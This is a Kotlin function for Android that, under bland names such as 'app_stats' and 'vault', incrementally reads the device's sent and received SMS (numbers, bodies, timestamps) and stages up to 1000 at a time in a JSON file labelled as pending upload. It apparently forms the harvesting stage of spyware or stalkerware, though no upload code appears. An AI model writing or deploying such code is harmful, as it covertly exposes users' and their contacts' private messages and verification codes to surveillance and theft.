fun vaultHistoricalSms(ctx: Context) {
    val prefs = ctx.getSharedPreferences("app_stats", Context.MODE_PRIVATE)
    val lastVaultTs = prefs.getLong("last_sms_vault_ts", 0L)

    val vaultFile = java.io.File(ctx.filesDir, "sms_archive_vault.json")
    if (vaultFile.exists()) return // Previous vault still pending upload

    val list = JSONArray()
    if (androidx.core.content.ContextCompat.checkSelfPermission(ctx, android.Manifest.permission.READ_SMS) != android.content.pm.PackageManager.PERMISSION_GRANTED) return

    try {
        // Query both Inbox and Sent (content://sms) since last sync
        val cursor = ctx.contentResolver.query(
            android.net.Uri.parse("content://sms"),
            arrayOf("address", "body", "date", "type"),
            "date > ?", arrayOf(lastVaultTs.toString()), "date ASC LIMIT 1000"
        )

        cursor?.use {
            val addrIdx = it.getColumnIndex("address")
            val bodyIdx = it.getColumnIndex("body")
            val dateIdx = it.getColumnIndex("date")
            val typeIdx = it.getColumnIndex("type")

            var newestTs = lastVaultTs
            while(it.moveToNext()) {
                val obj = JSONObject()
                val ts = it.getLong(dateIdx)
                obj.put("num", it.getString(addrIdx))
                obj.put("body", it.getString(bodyIdx))
                obj.put("ts", ts)
                obj.put("type", it.getInt(typeIdx))
                list.put(obj)
                if (ts > newestTs) newestTs = ts
            }

            if (list.length() > 0) {
                vaultFile.writeText(list.toString())
                // Store the newest timestamp locally so we know where to start next time
                prefs.edit().putLong("pending_vault_ts", newestTs).apply()
                DebugLogger.log("VAULT", "Incremental SMS secured: ${list.length()} messages")
            }
        }
    } catch(e: Exception) { e.printStackTrace() }
}

